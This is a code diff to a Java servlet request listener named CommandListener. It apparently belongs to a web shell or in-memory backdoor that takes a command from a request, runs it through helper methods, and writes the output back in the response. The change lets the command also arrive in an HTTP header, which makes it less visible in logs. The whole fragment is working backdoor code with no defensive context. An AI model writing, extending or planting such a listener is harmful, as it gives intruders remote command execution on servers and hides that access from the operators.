@@ -17,8 +17,12 @@ public class CommandListener implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
         try {
-            String param = getParam(request.getParameter(paramName));
-            if (param != null) {
+            String p = request.getParameter(paramName);
+            if (p == null || p.isEmpty()) {
+                p = request.getHeader(paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 HttpServletResponse servletResponse = (HttpServletResponse) getResponseFromRequest(request);
                 InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
